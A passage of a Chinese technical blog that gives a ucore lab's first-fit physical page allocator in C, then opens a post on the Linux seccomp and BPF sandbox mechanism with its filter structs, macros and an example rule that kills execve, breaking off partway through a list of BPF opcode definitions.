<h2 id="0x03-&#x521D;&#x59CB;&#x5316;&#x7A7A;&#x95F2;&#x7269;&#x7406;&#x5185;&#x5B58;&#xFF08;default-pmm-c-default-init-memmap&#xFF09;"><a href="#0x03-&#x521D;&#x59CB;&#x5316;&#x7A7A;&#x95F2;&#x7269;&#x7406;&#x5185;&#x5B58;&#xFF08;default-pmm-c-default-init-memmap&#xFF09;" class="headerlink" title="0x03 &#x521D;&#x59CB;&#x5316;&#x7A7A;&#x95F2;&#x7269;&#x7406;&#x5185;&#x5B58;&#xFF08;default_pmm.c:default_init_memmap&#xFF09;"></a>0x03 &#x521D;&#x59CB;&#x5316;&#x7A7A;&#x95F2;&#x7269;&#x7406;&#x5185;&#x5B58;&#xFF08;default_pmm.c:default_init_memmap&#xFF09;</h2><p>&#x6E05;&#x9664;&#x6807;&#x5FD7;&#x7A7A;&#x95F2;&#x7269;&#x7406;&#x5185;&#x5B58;&#x7684;&#x7ED3;&#x6784;&#x4F53;Page&#x7684;&#x6807;&#x5FD7;&#x4F4D;&#xFF0C;&#x8868;&#x793A;pages~KMEMSIZE&#x4E3A;&#x7A7A;&#x95F2;&#x5185;&#x5B58;&#xFF0C;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (; p != base + n; p ++) {</span><br><span class="line">    assert(PageReserved(p));</span><br><span class="line">    p-&gt;flags = p-&gt;property = <span class="number">0</span>;</span><br><span class="line">    set_page_ref(p, <span class="number">0</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>&#x8BBE;&#x7F6E;&#x7BA1;&#x7406;&#x8FDE;&#x7EED;&#x5185;&#x5B58;&#x7A7A;&#x95F2;&#x5757;&#x7684;&#x7ED3;&#x6784;&#x4F53;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> free_list;         <span class="comment">// the list header</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_free;           <span class="comment">// # of free pages in this free list</span></span><br><span class="line">} <span class="keyword">free_area_t</span>;</span><br></pre></td></tr></table></figure>
<p>TIPS&#xFF1A;pages~0x38000000&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x7269;&#x7406;&#x9875;&#x90FD;&#x5BF9;&#x5E94;&#x4E00;&#x4E2A;Page&#x7ED3;&#x6784;&#x4F53;&#xFF0C;ucore&#x901A;&#x8FC7;Page&#x7ED3;&#x6784;&#x4F53;&#x53BB;&#x7BA1;&#x7406;&#x7269;&#x7406;&#x5185;&#x5B58;&#xFF0C;free_area_t&#x7ED3;&#x6784;&#x4F53;&#x8BB0;&#x5F55;&#x7A7A;&#x95F2;&#x7684;&#x8FDE;&#x7EED;&#x7269;&#x7406;&#x5185;&#x5B58;&#x5757;&#x3002;</p>
<h2 id="0x04-first-fit&#x8FDE;&#x7EED;&#x7269;&#x7406;&#x5185;&#x5B58;&#x5206;&#x914D;&#x7B97;&#x6CD5;&#xFF08;&#x5B9E;&#x9A8C;&#xFF09;"><a href="#0x04-first-fit&#x8FDE;&#x7EED;&#x7269;&#x7406;&#x5185;&#x5B58;&#x5206;&#x914D;&#x7B97;&#x6CD5;&#xFF08;&#x5B9E;&#x9A8C;&#xFF09;" class="headerlink" title="0x04 first-fit&#x8FDE;&#x7EED;&#x7269;&#x7406;&#x5185;&#x5B58;&#x5206;&#x914D;&#x7B97;&#x6CD5;&#xFF08;&#x5B9E;&#x9A8C;&#xFF09;"></a>0x04 first-fit&#x8FDE;&#x7EED;&#x7269;&#x7406;&#x5185;&#x5B58;&#x5206;&#x914D;&#x7B97;&#x6CD5;&#xFF08;&#x5B9E;&#x9A8C;&#xFF09;</h2><h3 id="&#x601D;&#x8DEF;"><a href="#&#x601D;&#x8DEF;" class="headerlink" title="&#x601D;&#x8DEF;"></a>&#x601D;&#x8DEF;</h3><p>first-fit&#x7B97;&#x6CD5;&#x7684;&#x601D;&#x8DEF;&#x5C31;&#x662F;&#x6309;&#x5E8F;&#x904D;&#x5386;&#xFF0C;&#x5F53;&#x5927;&#x5C0F;&#x6EE1;&#x8DB3;&#x5373;&#x5206;&#x914D;&#xFF0C;&#x5177;&#x4F53;&#x6765;&#x8BF4;&#xFF1A;&#x5F53;&#x7533;&#x8BF7;&#x5185;&#x5B58;&#x65F6;first-fit&#x7684;&#x601D;&#x8DEF;&#x662F;&#x4ECE;&#x7A7A;&#x95F2;&#x94FE;&#x8868;&#x7684;&#x8868;&#x5934;&#x5F00;&#x59CB;&#x5BFB;&#x627E;&#x5730;&#x5740;&#x6700;&#x5C0F;&#x7684;&#x7269;&#x7406;&#x9875;&#xFF0C;&#x901A;&#x8FC7;nr_free-&gt;next&#x6216;&#x8005;&#x901A;&#x8FC7;&#x5B9A;&#x4E49;&#x597D;&#x7684;&#x51FD;&#x6570;list_next&#x53BB;&#x5BFB;&#x627E;&#xFF0C;&#x627E;&#x5230;&#x7A7A;&#x95F2;&#x7269;&#x7406;&#x9875;&#x540E;&#xFF0C;&#x9700;&#x8981;&#x5224;&#x65AD;&#x5927;&#x5C0F;&#x662F;&#x4E0D;&#x662F;&#x6EE1;&#x8DB3;&#xFF0C;&#x8FD9;&#x4E3B;&#x8981;&#x901A;&#x8FC7;Page&#x7ED3;&#x6784;&#x4F53;&#x7684;property&#x6210;&#x5458;&#x5224;&#x65AD;&#xFF0C;&#x6240;&#x4EE5;&#x9700;&#x8981;&#x901A;&#x8FC7;le2page&#x5B8F;&#xFF0C;&#x901A;&#x8FC7;&#x94FE;&#x8868;&#x5143;&#x7D20;&#x6307;&#x9488;nr_free&#x8BA1;&#x7B97;&#x51FA;&#x76F8;&#x5E94;&#x7684;Page&#x6307;&#x9488;p&#xFF0C;&#x5F53;property&gt;=n&#x65F6;&#xFF0C;&#x5927;&#x5C0F;&#x6EE1;&#x8DB3;&#xFF0C;&#x5373;&#x5206;&#x914D;&#x51FA;&#x53BB;&#x3002;</p>
<h3 id="&#x5B9E;&#x73B0;"><a href="#&#x5B9E;&#x73B0;" class="headerlink" title="&#x5B9E;&#x73B0;"></a>&#x5B9E;&#x73B0;</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *</span></span><br><span class="line"><span class="class"><span class="title">default_alloc_pages</span>(<span class="title">size_t</span> <span class="title">n</span>) {</span></span><br><span class="line">    assert(n &gt; <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (n &gt; nr_free) {</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span> = <span class="title">NULL</span>;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> *le = &amp;free_list;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> optimize (next-fit)</span></span><br><span class="line">    <span class="keyword">while</span> ((le = list_next(le)) != &amp;free_list) {</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> = <span class="title">le2page</span>(<span class="title">le</span>, <span class="title">page_link</span>);</span></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;property &gt;= n) {</span><br><span class="line">            page = p;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (page != <span class="literal">NULL</span>) {</span><br><span class="line">        <span class="keyword">if</span> (page-&gt;property &gt; n) {</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> = <span class="title">page</span> + <span class="title">n</span>;</span></span><br><span class="line">            p-&gt;property = page-&gt;property - n;</span><br><span class="line">            SetPageProperty(p);</span><br><span class="line">            list_add_after(&amp;(page-&gt;page_link), &amp;(p-&gt;page_link));</span><br><span class="line">        }</span><br><span class="line">        list_del(&amp;(page-&gt;page_link));</span><br><span class="line">        nr_free -= n;</span><br><span class="line">        ClearPageProperty(page);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> page;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">default_free_pages(struct Page *base, <span class="keyword">size_t</span> n) {</span><br><span class="line">    assert(n &gt; <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> = <span class="title">base</span>;</span></span><br><span class="line">    <span class="keyword">for</span> (; p != base + n; p ++) {</span><br><span class="line">        assert(!PageReserved(p) &amp;&amp; !PageProperty(p));</span><br><span class="line">        p-&gt;flags = <span class="number">0</span>;</span><br><span class="line">        set_page_ref(p, <span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    base-&gt;property = n;</span><br><span class="line">    SetPageProperty(base);</span><br><span class="line">    <span class="keyword">list_entry_t</span> *le = list_next(&amp;free_list);</span><br><span class="line">    <span class="keyword">while</span> (le != &amp;free_list) {</span><br><span class="line">        p = le2page(le, page_link);</span><br><span class="line">        le = list_next(le);</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> optimize</span></span><br><span class="line">        <span class="keyword">if</span> (base + base-&gt;property == p) {</span><br><span class="line">            base-&gt;property += p-&gt;property;</span><br><span class="line">            ClearPageProperty(p);</span><br><span class="line">            list_del(&amp;(p-&gt;page_link));</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p + p-&gt;property == base) {</span><br><span class="line">            p-&gt;property += base-&gt;property;</span><br><span class="line">            ClearPageProperty(base);</span><br><span class="line">            base = p;</span><br><span class="line">            list_del(&amp;(p-&gt;page_link));</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    nr_free += n;</span><br><span class="line">    le = list_next(&amp;free_list);</span><br><span class="line">    <span class="keyword">while</span> (le != &amp;free_list) {</span><br><span class="line">        p = le2page(le, page_link);</span><br><span class="line">        <span class="keyword">if</span> (base + base-&gt;property &lt;= p) {</span><br><span class="line">            assert(base + base-&gt;property != p);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        le = list_next(le);</span><br><span class="line">    }</span><br><span class="line">    list_add_before(le, &amp;(base-&gt;page_link));</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/09/22/seccomp沙箱机制 &amp; 2019ByteCTF VIP/">seccomp沙箱机制 &amp; 2019ByteCTF VIP</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-09-22</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/heap/">heap</a></span><div class="content"><h2 id="0x00-seccomp&#x6C99;&#x7BB1;&#x673A;&#x5236;"><a href="#0x00-seccomp&#x6C99;&#x7BB1;&#x673A;&#x5236;" class="headerlink" title="0x00 seccomp&#x6C99;&#x7BB1;&#x673A;&#x5236;"></a>0x00 seccomp&#x6C99;&#x7BB1;&#x673A;&#x5236;</h2><p>seccomp &#x662F; Linux &#x5185;&#x6838;&#x63D0;&#x4F9B;&#x7684;&#x4E00;&#x79CD;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x6C99;&#x7BB1;&#x673A;&#x5236;&#xFF0C;seccomp &#x901A;&#x8FC7;&#x53EA;&#x5141;&#x8BB8;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x8C03;&#x7528; exit(), sigreturn(), read() &#x548C; write() &#x56DB;&#x79CD;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x6765;&#x8FBE;&#x5230;&#x6C99;&#x7BB1;&#x7684;&#x6548;&#x679C;&#x3002;&#x5982;&#x679C;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x8C03;&#x7528;&#x4E86;&#x9664;&#x4E86;&#x8FD9;&#x56DB;&#x79CD;&#x4E4B;&#x5916;&#x7684;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#xFF0C; kernel &#x4F1A;&#x5411;&#x8FDB;&#x7A0B;&#x53D1;&#x9001; SIGKILL &#x4FE1;&#x53F7;&#x3002;</p>
<p>seccomp &#x5F88;&#x96BE;&#x5728;&#x5B9E;&#x9645;&#x4E2D;&#x5F97;&#x5230;&#x63A8;&#x5E7F;&#xFF0C;&#x56E0;&#x4E3A;&#x9650;&#x5236;&#x5B9E;&#x5728;&#x662F;&#x592A;&#x591A;&#x4E86;&#xFF0C;Linus &#x672C;&#x4EBA;&#x4E5F;&#x5BF9;&#x5B83;&#x7684;&#x5E94;&#x7528;&#x6301;&#x6000;&#x7591;&#x7684;&#x6001;&#x5EA6;&#xFF0C;&#x76F4;&#x5230;&#x51FA;&#x73B0;&#x4E86; seccomp-bpf&#x3002;seccomp-bpf &#x662F; seccomp &#x7684;&#x4E00;&#x4E2A;&#x6269;&#x5C55;&#xFF0C;&#x5B83;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x914D;&#x7F6E;&#x6765;&#x5141;&#x8BB8;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x8C03;&#x7528;&#x5176;&#x4ED6;&#x7684;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x3002;chrome &#x4E2D;&#x7B2C;&#x4E00;&#x4E2A;&#x5E94;&#x7528; seccomp-bpf &#x7684;&#x573A;&#x666F;&#x662F;&#x628A; Flash &#x653E;&#x5230;&#x4E86;&#x6C99;&#x7BB1;&#x91CC;&#x8FD0;&#x884C;&#xFF08;&#x5B9E;&#x5728;&#x662F;&#x4E0D;&#x653E;&#x5FC3;&#xFF09;&#xFF0C;&#x540E;&#x7EED;&#x4E5F;&#x628A; render &#x7684;&#x8FC7;&#x7A0B;&#x653E;&#x5230;&#x4E86;&#x6C99;&#x7BB1;&#x91CC;&#x3002;</p>
<h2 id="0x01-BPF-Berkeley-Packets-Filter"><a href="#0x01-BPF-Berkeley-Packets-Filter" class="headerlink" title="0x01 BPF (Berkeley Packets Filter)"></a>0x01 BPF (Berkeley Packets Filter)</h2><p>BPF&#x662F;&#x7C7B;Unix&#x7CFB;&#x7EDF;&#x4E0A;&#x9488;&#x5BF9;&#x6570;&#x636E;&#x94FE;&#x8DEF;&#x5C42;&#x7684;&#x539F;&#x751F;&#x63A5;&#x53E3;&#xFF0C;&#x63D0;&#x4F9B;&#x6570;&#x636E;&#x94FE;&#x8DEF;&#x5C42;&#x5C01;&#x5305;&#x7684;&#x6536;&#x53D1;&#xFF0C;BPF&#x4E5F;&#x652F;&#x6301;&#x5C01;&#x5305;&#x8FC7;&#x6EE4;&#xFF0C;&#x5176;&#x8FC7;&#x6EE4;&#x89C4;&#x5219;&#x5728;linux&#x4E2D;&#x5E94;&#x7528;&#x5230;&#x4E86;&#x5F88;&#x591A;&#x5730;&#x65B9;&#x3002;xt_bpf&#x5BF9;netfilter&#xFF0C;cls_bpf&#x5728;&#x5185;&#x6838;&#x7684;qdisk&#x5C42;&#xFF0C;SECCOMP-BPF&#xFF0C;&#x4EE5;&#x53CA;&#x4E00;&#x7CFB;&#x5217;&#x5176;&#x4ED6;&#x5730;&#x65B9;&#x4F8B;&#x5982;&#xFF1A;team driver&#x3001;PTP code&#x7B49;BPF&#x90FD;&#x88AB;&#x7528;&#x5230;&#x3002;</p>
<p>BPF&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E2A;&#x4F2A;&#x673A;&#x5668;&#x3002;&#x8FD9;&#x4E2A;&#x4F2A;&#x673A;&#x5668;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x4EE3;&#x7801;&#xFF0C;&#x5305;&#x542B;&#x4E00;&#x4E2A;32&#x4F4D;&#x7684;&#x7D2F;&#x52A0;&#x5668;A&#xFF0C;&#x4E00;&#x4E2A;32&#x4F4D;&#x7684;&#x7D22;&#x5F15;&#x5BC4;&#x5B58;&#x5668;X&#xFF0C;&#x4E00;&#x4E2A;16 x 32&#x4F4D;&#x7684;&#x5185;&#x5B58;&#x548C;&#x4E00;&#x4E2A;&#x9690;&#x542B;&#x7684;&#x7A0B;&#x5E8F;&#x8BA1;&#x6570;&#x5668;&#xFF0C;&#x5177;&#x6709;&#x6709;&#x8D4B;&#x503C;&#x3001;&#x7B97;&#x672F;&#x3001;&#x8DF3;&#x8F6C;&#x6307;&#x4EE4;&#x3002;</p>
<p>&#x4E00;&#x6761;&#x6307;&#x4EE4;&#x7531;&#x4E00;&#x4E2A;&#x5B9A;&#x4E49;&#x597D;&#x7684;&#x7ED3;&#x6784;&#x4F53;sock_filter&#x8868;&#x793A;&#xFF0C;&#x5F62;&#x5F0F;&#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> {</span>            <span class="comment">/* Filter block */</span></span><br><span class="line">    __u16 code;                 <span class="comment">/* Actual filter code */</span></span><br><span class="line">    __u8  jt;                   <span class="comment">/* Jump true */</span></span><br><span class="line">    __u8  jf;                   <span class="comment">/* Jump false */</span></span><br><span class="line">    __u32 k;                    <span class="comment">/* Generic multiuse field */</span></span><br><span class="line">};</span><br></pre></td></tr></table></figure>
<p>&#x4E0E;&#x771F;&#x6B63;&#x7684;&#x673A;&#x5668;&#x4EE3;&#x7801;&#x5F88;&#x76F8;&#x4F3C;&#xFF0C;&#x82E5;&#x5E72;&#x4E2A;&#x8FD9;&#x6837;&#x7684;&#x7ED3;&#x6784;&#x4F53;&#x7EC4;&#x6210;&#x7684;&#x7ED3;&#x6784;&#x4F53;&#x6570;&#x7EC4;&#xFF0C;&#x5C31;&#x6210;&#x4E3A;BPF&#x7684;&#x6307;&#x4EE4;&#x5E8F;&#x5217;&#x3002;</p>
<p>&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#x7F16;&#x5199;&#x89C4;&#x5219;&#xFF0C;BPF&#x7684;&#x8BBE;&#x8BA1;&#x8005;&#x5B9A;&#x4E49;&#x4E86;&#x4E24;&#x4E2A;&#x6307;&#x4EE4;&#x5B8F;&#x6765;&#x5B8C;&#x6210;&#x89C4;&#x5219;&#x7684;&#x7F16;&#x5199;&#xFF08;/usr/include/linux/bpf_common.h&#xFF09;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> BPF_STMT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_STMT(code, k) { (unsigned short)(code), 0, 0, k }</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> BPF_JUMP</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JUMP(code, k, jt, jf) { (unsigned short)(code), jt, jf, k }</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>&#x800C;BPF&#x7684;&#x8FC7;&#x6EE4;&#x89C4;&#x5219;&#x5C31;&#x662F;&#x7531;&#x8FD9;&#x4E24;&#x4E2A;&#x6307;&#x4EE4;&#x5B8F;&#x7EC4;&#x6210;&#x7684;&#x6307;&#x4EE4;&#x5E8F;&#x5217;&#x5B8C;&#x6210;&#x7684;&#xFF0C;&#x8FD9;&#x4E2A;&#x5E8F;&#x5217;&#x662F;&#x4E00;&#x4E2A;&#x7ED3;&#x6784;&#x4F53;&#x6570;&#x7EC4;&#xFF0C;&#x4E0B;&#x9762;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x8FC7;&#x6EE4;execve&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x7684;&#x8FC7;&#x6EE4;&#x89C4;&#x5219;&#xFF1A;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] = {</span></span><br><span class="line">    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class="number">0</span>),           <span class="comment">//&#x5C06;&#x5E27;&#x7684;&#x504F;&#x79FB;0&#x5904;&#xFF0C;&#x53D6;4&#x4E2A;&#x5B57;&#x8282;&#x6570;&#x636E;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x53F7;&#x7684;&#x503C;&#x8F7D;&#x5165;&#x7D2F;&#x52A0;&#x5668;</span></span><br><span class="line">    BPF_JUMP(BPF_JMP+BPF_JEQ,<span class="number">59</span>,<span class="number">0</span>,<span class="number">1</span>),           <span class="comment">//&#x5F53;A == 59&#x65F6;&#xFF0C;&#x987A;&#x5E8F;&#x6267;&#x884C;&#x4E0B;&#x4E00;&#x6761;&#x89C4;&#x5219;&#xFF0C;&#x5426;&#x5219;&#x8DF3;&#x8FC7;&#x4E0B;&#x4E00;&#x6761;&#x89C4;&#x5219;&#xFF0C;&#x8FD9;&#x91CC;&#x7684;59&#x5C31;&#x662F;x64&#x7684;execve&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x53F7;</span></span><br><span class="line">    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),   <span class="comment">//&#x8FD4;&#x56DE;KILL</span></span><br><span class="line">    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),  <span class="comment">//&#x8FD4;&#x56DE;ALLOW</span></span><br><span class="line">};</span><br></pre></td></tr></table></figure>
<p>&#x8FD9;&#x4E24;&#x4E2A;&#x6307;&#x4EE4;&#x5B8F;&#x5C55;&#x5F00;&#x540E;&#xFF0C;&#x5176;&#x5B9E;&#x4E5F;&#x90FD;&#x662F;&#x8D4B;&#x4E86;&#x503C;&#x7684;sock_filter&#x7ED3;&#x6784;&#x4F53;&#x3002;&#x4ED6;&#x53EA;&#x662F;&#x5C01;&#x88C5;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x65B9;&#x4FBF;&#x4F7F;&#x7528;&#x3002;</p>
<p>BPF_STMT&#x548C;BPF_JUMP&#x7684;&#x64CD;&#x4F5C;&#x6307;&#x4EE4;&#x7531;&#x4EE5;&#x4E0B;&#x7EC4;&#x6210;&#xFF1A;&#xFF08;&#x64CD;&#x4F5C;&#x6570;&#x4E3A;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#xFF09;</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_CLASS(code) ((code) &amp; 0x07)			<span class="comment">//&#x9996;&#x5148;&#x6307;&#x5B9A;&#x64CD;&#x4F5C;&#x7684;&#x7C7B;&#x522B;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_LD		0x00										<span class="comment">//&#x5C06;&#x64CD;&#x4F5C;&#x6570;&#x88C5;&#x5165;A&#x6216;&#x8005;X</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_LDX		0x01					</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_ST		0x02										<span class="comment">//&#x62F7;&#x8D1D;A&#x6216;X&#x7684;&#x503C;&#x5230;&#x5185;&#x5B58;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_STX		0x03</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_ALU		0x04										<span class="comment">//&#x7528;X&#x6216;&#x5E38;&#x6570;&#x4F5C;&#x4E3A;&#x64CD;&#x4F5C;&#x6570;&#x5728;&#x7D2F;&#x52A0;&#x5668;&#x4E0A;&#x6267;&#x884C;&#x7B97;&#x6570;&#x6216;&#x903B;&#x8F91;&#x8FD0;&#x7B97;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_JMP		0x05										<span class="comment">//&#x8DF3;&#x8F6C;&#x6307;&#x4EE4;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_RET		0x06										<span class="comment">//&#x7EC8;&#x6B62;&#x8FC7;&#x6EE4;&#x5668;&#x5E76;&#x8868;&#x660E;&#x62A5;&#x6587;&#x7684;&#x54EA;&#x4E00;&#x90E8;&#x5206;&#x4FDD;&#x7559;&#x4E0B;&#x6765;&#xFF0C;&#x5982;&#x679C;&#x8FD4;&#x56DE;0&#xFF0C;&#x62A5;&#x6587;&#x5168;&#x90E8;&#x88AB;&#x4E22;&#x5F03;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_MISC     0x07</span></span><br><span class="line">	</span><br><span class="line"><span class="comment">/* ld/ldx fields */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_SIZE(code)  ((code) &amp; 0x18)         <span class="comment">//&#x5728;ld&#x65F6;&#x6307;&#x5B9A;&#x64CD;&#x4F5C;&#x6570;&#x7684;&#x5927;&#x5C0F;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_W		0x00				<span class="comment">//&#x53CC;&#x5B57;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_H		0x08				<span class="comment">//&#x5355;&#x5B57;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_B		0x10				<span class="comment">//&#x5355;&#x5B57;&#x8282;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MODE(code)  ((code) &amp; 0xe0)         <span class="comment">//&#x64CD;&#x4F5C;&#x6570;&#x7C7B;&#x578B;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_IMM		0x00</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_ABS		0x20						<span class="comment">//&#x7EDD;&#x5BF9;&#x504F;&#x79FB;					</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_IND		0x40						<span class="comment">//&#x76F8;&#x5BF9;&#x504F;&#x79FB;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_MEM		0x60</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_LEN		0x80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_MSH		